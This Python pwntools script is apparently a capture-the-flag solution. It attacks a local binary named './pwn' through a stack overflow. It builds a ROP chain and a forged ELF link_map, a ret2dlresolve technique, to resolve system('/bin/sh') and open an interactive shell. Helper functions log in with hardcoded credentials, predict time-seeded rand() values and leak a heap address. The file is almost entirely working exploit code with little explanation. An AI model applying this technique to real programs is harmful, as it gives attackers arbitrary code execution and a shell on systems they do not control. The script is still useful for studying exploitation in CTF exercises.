from pwn import *
import ctypes
import time
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-l 100']
context.log_level = 'debug'
file_name = './pwn'
ld_name = './ld-linux-x86-64.so.2'
io = process([ld_name, '--library-path', '.', file_name])
libc = ELF('./libc.so.6')
elf = ELF(file_name)
pr = lambda x:success('\x1b[01;38;5;214m'+hex(x)+'\x1b[0m')
sl = lambda x:io.sendline(x)
s  = lambda x:io.send(x) 
rt = lambda x:io.recvuntil(x)
ri = lambda x:int(io.recv(x),16)
ru = lambda x:u64(io.recv(x).ljust(8,b'\x00'))
it = lambda  :io.interactive()
sp = lambda  :sleep(1.5)
q  = lambda  :sleep(0.2)

OFF = 0x58
BACKDOOR = 0x401236
USER = "admin"
PASSWORD = "123456"
INFO1 = "input your name:"
INFO2 = "input your pasword:"
LIMIT = ''
POP_RDI_RET = 0x0000000000401156 
POP_RSI_R15 = 0x000000000040115b
RET = 0x000000000040101a
FAKE_LINK_MAP_ADDR = 0x404a00
def auth_login():
    rt(INFO1)
    s(USER)
    rt(INFO2)
    s(PASSWORD)

def get_random():
    # 加载系统 libc（与目标程序相同）
    libc2 = ctypes.CDLL("./libc.so.6")
    # 获取当前时间戳（与 C 中 time(0) 一致）
    seed = int(time.time())
    # 设置相同种子
    libc2.srand(ctypes.c_uint(seed))
    # 生成第一个 rand() % 100，与 C 程序中的 v5 完全一致
    rand_num = libc2.rand() % 100
    return str(rand_num).encode()

def build_backdoor():
    pd = b'a'*(OFF-0x10)
    pd += flat(LIMIT,0)
    pd += flat(RET,BACKDOOR)
    return pd

def leak():
    global LIMIT
    rt("chunk_addr: ")
    LIMIT = ri(16)
    pr(LIMIT)

def get_fake_link_map(FAKE_LINK_MAP_ADDR,l_addr,st_value):
    #the address of each fake pointer
     fake_Elf64_Dyn_STR_addr=p64(FAKE_LINK_MAP_ADDR)
     fake_Elf64_Dyn_SYM_addr=p64(FAKE_LINK_MAP_ADDR+0x8)
     fake_Elf64_Dyn_JMPREL_addr=p64(FAKE_LINK_MAP_ADDR+0x18)#这里的值就是伪造的.rel.plt的地址
     #fake structure
     fake_Elf64_Dyn_SYM =p64(0)+p64(st_value-0x8)
     fake_Elf64_Dyn_JMPREL = p64(0)+p64(FAKE_LINK_MAP_ADDR+0x28)
       # JMPREL point to the address of .rel.plt，which will be located in FAKE_LINK_MAP_ADDR+0x28
     r_offset = FAKE_LINK_MAP_ADDR - l_addr
     fake_Elf64_rela =p64(r_offset)+p64(0x7)+p64(0)
     #fake_link_map
     fake_link_map =p64(l_addr&(2**64-1))# 0x8
     fake_link_map+=fake_Elf64_Dyn_SYM   # 0x18
     fake_link_map+=fake_Elf64_Dyn_JMPREL# 0x28
     fake_link_map+=fake_Elf64_rela      # 0x40
     fake_link_map+=b"\x00"*0x28         # 0x68
     fake_link_map+=fake_Elf64_Dyn_STR_addr     # STRTAB pointer,0x70
     fake_link_map+=fake_Elf64_Dyn_SYM_addr     # SYMTAB pointer,0x78
     fake_link_map+=b"/bin/sh\x00".ljust(0x80,b'\x00') # 0xf8
     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  # JMPREL pointer
     return fake_link_map

def build_ret2dlresolve():
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    pr(plt0)#0x401020
    pr(elf.plt['read'])
    l_addr=libc.sym['system'] - libc.sym['read']
    st_value=elf.got['read']
    fake_link_map=get_fake_link_map(FAKE_LINK_MAP_ADDR,l_addr,st_value)
    payload = b'a'*0x40+ p64(0xdeadbeef) + p64(POP_RDI_RET) + p64(0) + p64(POP_RSI_R15) + p64(FAKE_LINK_MAP_ADDR) + p64(0) + p64(elf.plt['read'])
    payload += p64(RET) + p64(POP_RDI_RET) + p64(FAKE_LINK_MAP_ADDR+0x78) + p64(plt0+6) + p64(FAKE_LINK_MAP_ADDR) + p64(0)
    return payload,fake_link_map

#gdb.attach(io,"b *0x40120E")
rt("payload:")
pay,fake_link_map = build_ret2dlresolve()
sleep(2)
io.send(pay)
#pause()
io.send(fake_link_map)


it()
